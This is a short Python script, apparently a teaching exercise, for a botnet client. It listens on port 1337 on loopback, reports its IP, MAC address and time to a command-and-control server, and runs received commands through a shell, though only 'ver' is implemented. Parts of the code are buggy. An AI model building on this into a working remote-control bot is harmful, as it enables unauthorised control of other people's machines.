#!/usr/bin/python
#Charles V. Frank Jr.
#This script creates a bot that listens on a port
#When the C&C issues a command, the bot will 
#(1)respond back with its app address, its mac, date/time
#(2)display command on the screen
#(3)execute the command and send results back to the server
#package added for netifaces: https://pypi.python.org/pypi/netifaces

import socket
import sys
from uuid import getnode as get_mac
import datetime
import signal
import subprocess

#get the IP of the bot
bot_ip = socket.gethostbyname(socket.gethostname())

#for now, provide the loopback address
#
bot_ip = "127.0.0.1"

#get the MAC of the bot
bot_mac = str(hex(get_mac()))
#get rid of 0x in the beginning of the string
bot_mac = bot_mac[2: len(bot_mac) - 1 ]
#put ':' after every two characters
bot_mac = ':'.join([bot_mac[i:i+2] for i,j in enumerate(bot_mac) if not (i%2)])

#create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#port to communicate on
port=1337

#Reuse the socket if needed
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#bind to the port , listen for all IPs
s.bind((bot_ip, port))

#listen for command
s.listen(5)

#listen as long as running
while True:

    #accept connection from the server
    c, addr = s.accept()

    #receive the command
    while True:
        #command received
        command = c.recv(1024).decode()
        if command:
            
            #get the current date/time of the bot
            bot_now = datetime.datetime.now()
            #bot response
            bot_response = str(bot_ip) + "," + str(bot_mac) + "," + str(bot_now)
            
            #send bot response back to C&C
            c.sendall(bot_response.encode())

            #print command
            print(command)
            
            #execute command
            if command == "ver" :
                proc = subprocess.Popen(['ver'], stdout=subprocess.PIPE, shell=True)
                (out, err) = proc.communicate()
                c.sendall(out.encode())
                
        else:
            break

#Close the socket
s.close
